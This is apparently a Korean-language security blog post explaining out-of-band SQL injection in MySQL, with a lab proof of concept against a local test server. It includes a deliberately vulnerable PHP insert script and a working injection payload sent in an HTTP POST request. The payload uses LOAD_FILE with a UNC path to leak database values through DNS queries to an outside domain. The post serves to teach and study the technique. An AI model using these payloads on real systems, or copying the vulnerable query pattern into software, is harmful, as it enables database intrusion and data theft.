---
layout: post
title:  "SQL Injection - Out of band"
tag:   Analysis
categories: Web
---

## 서론
SQL Injection이 가능하지만 In band(Error based, Union)로는 결과를 확인 할 수 없을때, 그 외에 Boolean based, Time based로는 결과를 확인할 수 없거나 너무 느릴 때 OOB(Out of band) 기법을 사용합니다.

오래 전에 공개된 기법이기에 운영체제별, DBMS 종류별, 버전별로 공격이 불가능 할 수도 있습니다. 하지만 최근에 paypal에서 발생한 취약점 때문에 아직까지도 실효성이 있다고 판단했습니다.

> Paypal Bug bounty 2016 - Exploiting Blind SQLI using OOB technique - https://youtu.be/_i9u8O2ehlg

> DEFCON 15 - https://www.youtube.com/watch?v=QzZyFcjQ25Y

## Out of band
Out of band는 쿼리의 결과를 다른 외부 채널을 통해 전달하는 기법입니다. 예를들어 쿼리의 결과를 HTTP 패킷에 담아서 보내기도하고, DNS 서버에 질의를 보내게 하기도 합니다.

```SQL
SELECT LOAD_FILE(CONCAT('\\\\',(select @@version),'.nisambot.com\\test'));
-- 5.5.11.nisambot.com을 DNS 서버에 질의를 함
```
> DNS를 이용한 OOB 예시 - mysql

## MYSQL DNS OOB - PoC

![main.PNG]({{ site.url }}/assets/image/2016-12-09/main.png)

공격 대상이 되는 서버의 웹페이지 입력폼입니다.

> 공격 대상 서버 환경 Windows xp sp3, apache 2.4.9, mysql 5.5.36, PHP Version 5.4.27

<br />

```php
<?php
// insert.php

$conn = mysqli_connect("localhost", "***", "***", "***");

$query = "INSERT INTO contact (email, subject, message) VALUES ('".$_POST['email']."', '".$_POST['subject']."', '".$_POST['message']."');"; // SQLI 발생

mysqli_query($conn, $query);

?>
```
유저의 입력값이 삽입되어 SQLI가 발생하는 파일입니다. 응답값 없이 INSERT 구문만 처리합니다.

<br />

```mysql
mysql> desc contact;
+---------+---------------------+------+-----+---------+----------------+
| Field   | Type                | Null | Key | Default | Extra          |
+---------+---------------------+------+-----+---------+----------------+
| no      | bigint(20) unsigned | NO   | PRI | NULL    | auto_increment |
| email   | varchar(100)        | YES  |     | NULL    |                |
| subject | varchar(300)        | YES  |     | NULL    |                |
| message | varchar(300)        | YES  |     | NULL    |                |
+---------+---------------------+------+-----+---------+----------------+
```
TABLE 구조입니다.

<br />

```HTTP
POST http://192.168.2.3/insert.php HTTP/1.1
Host: 192.168.2.3
Connection: keep-alive
Content-Length: 133
Cache-Control: max-age=0
Origin: http://192.168.2.3
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.99 Safari/537.36
Content-Type: application/x-www-form-urlencoded
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Referer: http://192.168.2.3/
Accept-Encoding: gzip, deflate
Accept-Language: ko-KR,ko;q=0.8,en-US;q=0.6,en;q=0.4

email=asdf&subject='%2C+(SELECT+LOAD_FILE(CONCAT('%5C%5C%5C%5C'%2C(select+user())%2C'.nisambot.com%5C%5Ctest'))))%3B+--+&message=asdf
```
SQLI에 취약한 파라미터에 쿼리문을 작성해서 전송합니다.

<br />

```SQL
INSERT INTO contact (email, subject, message) VALUES ('asdf', '', (SELECT LOAD_FILE(CONCAT('\\\\',(select user()),'.nisambot.com\\test')))); -- ', 'asdf');
```
최종적으로 서버 완성되는 쿼리입니다.

<br />

![dns질의.PNG]({{ site.url }}/assets/image/2016-12-09/dns_query.png)

쿼리가 실행되는 서버에서 캡처한 패킷입니다.

user() 함수의 반환값인 root@localhost를 문자열과 합쳐 DNS서버에 질의하게 됩니다. (특수문자 같은것이 포함되므로 hex값으로 바꿔서 보내는것이 좋음)

DNS 서버를 구축하여 DNS 질의를 받아본다면 공격자 서버에서도 같은 결과를 받아볼 수 있습니다.
